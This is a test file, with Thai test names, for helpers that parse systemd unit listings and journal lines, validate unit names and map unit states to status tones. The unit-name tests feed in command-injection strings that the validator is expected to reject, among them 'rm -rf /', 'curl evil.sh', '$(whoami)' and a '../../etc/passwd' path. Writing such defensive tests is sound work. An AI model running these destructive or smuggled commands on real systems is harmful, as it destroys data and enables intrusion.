import { describe, it, expect } from 'vitest'
import { parseSystemdUnits, isValidUnitName, parseJournal } from './systemd-parse'
import { unitTone } from '@shared/systemd-status'

const SAMPLE = `UNIT                        LOAD   ACTIVE   SUB     DESCRIPTION
  nginx.service             loaded active   running A high performance web server
  ssh.service               loaded active   running OpenBSD Secure Shell server
● mysql.service             loaded failed   failed  MySQL Community Server
  cron.service              loaded active   exited  Regular background program
  ghost.service             not-found inactive dead  ghost.service

LOAD   = Reflects whether the unit definition was properly loaded.
5 loaded units listed.`

describe('parseSystemdUnits', () => {
  it('อ่านตารางได้ครบทุก unit', () => {
    const units = parseSystemdUnits(SAMPLE)
    expect(units.map((u) => u.unit)).toEqual([
      'nginx.service',
      'ssh.service',
      'mysql.service',
      'cron.service',
      'ghost.service'
    ])
  })

  it('ตัด ● ที่นำหน้า unit ที่ล้มเหลวออก', () => {
    const mysql = parseSystemdUnits(SAMPLE).find((u) => u.unit === 'mysql.service')
    expect(mysql).toMatchObject({ load: 'loaded', active: 'failed', sub: 'failed' })
  })

  it('เก็บ description ที่มีช่องว่างได้ครบ', () => {
    const nginx = parseSystemdUnits(SAMPLE).find((u) => u.unit === 'nginx.service')
    expect(nginx?.description).toBe('A high performance web server')
  })

  it('ข้ามหัวตารางและบรรทัดสรุปท้าย', () => {
    const units = parseSystemdUnits(SAMPLE)
    expect(units.some((u) => u.unit.toUpperCase() === 'UNIT')).toBe(false)
    expect(units.some((u) => u.unit.includes('loaded'))).toBe(false)
  })

  it('ผลลัพธ์ว่าง/ขยะ → คืนอาร์เรย์ว่าง ไม่ throw', () => {
    expect(parseSystemdUnits('')).toEqual([])
    expect(parseSystemdUnits('command not found')).toEqual([])
  })
})

describe('isValidUnitName', () => {
  it('ชื่อ unit ปกติผ่าน', () => {
    expect(isValidUnitName('nginx.service')).toBe(true)
    expect(isValidUnitName('getty@tty1.service')).toBe(true)
    expect(isValidUnitName('backup.timer')).toBe(true)
  })

  it('กันคำสั่งแปลกปลอมที่ยัดมากับชื่อ unit', () => {
    expect(isValidUnitName('nginx.service; rm -rf /')).toBe(false)
    expect(isValidUnitName('a.service && curl evil.sh')).toBe(false)
    expect(isValidUnitName('$(whoami).service')).toBe(false)
    expect(isValidUnitName('`id`.service')).toBe(false)
    expect(isValidUnitName('a.service|sh')).toBe(false)
  })

  it('ต้องลงท้ายด้วยชนิดที่รองรับ', () => {
    expect(isValidUnitName('nginx')).toBe(false)
    expect(isValidUnitName('../../etc/passwd')).toBe(false)
  })

  it('ชื่อว่างหรือยาวเกิน → ไม่ผ่าน', () => {
    expect(isValidUnitName('')).toBe(false)
    expect(isValidUnitName(`${'a'.repeat(200)}.service`)).toBe(false)
  })
})

describe('unitTone', () => {
  it('ทำงานอยู่ = ok, ล้มเหลว = error', () => {
    expect(unitTone({ active: 'active', sub: 'running' })).toBe('ok')
    expect(unitTone({ active: 'failed', sub: 'failed' })).toBe('error')
  })
  it('กำลังเริ่ม/รีสตาร์ทวน = warn', () => {
    expect(unitTone({ active: 'activating', sub: 'start' })).toBe('warn')
    expect(unitTone({ active: 'active', sub: 'auto-restart' })).toBe('warn')
  })
  it('รันจบแล้ว (oneshot) = idle ไม่ใช่ error', () => {
    expect(unitTone({ active: 'active', sub: 'exited' })).toBe('idle')
    expect(unitTone({ active: 'inactive', sub: 'dead' })).toBe('idle')
  })
})

describe('parseJournal', () => {
  it('แยกเวลา/host/แหล่ง/ข้อความได้', () => {
    const [l] = parseJournal('Jul 23 08:12:01 web-01 nginx[1234]: started')
    expect(l).toEqual({
      time: 'Jul 23 08:12:01',
      host: 'web-01',
      source: 'nginx[1234]',
      message: 'started'
    })
  })

  it('บรรทัดที่ไม่เข้ารูปแบบ เก็บเป็นข้อความล้วน', () => {
    const [l] = parseJournal('-- Logs begin at Mon 2026-07-20 --')
    expect(l.time).toBe('')
    expect(l.message).toBe('-- Logs begin at Mon 2026-07-20 --')
  })

  it('ข้อความที่มี : ข้างในไม่ถูกตัดผิด', () => {
    const [l] = parseJournal('Jul 23 08:12:01 web-01 app[1]: GET /a: 200 ok')
    expect(l.message).toBe('GET /a: 200 ok')
  })

  it('ข้ามบรรทัดว่าง', () => {
    expect(parseJournal('\n\n')).toEqual([])
  })
})
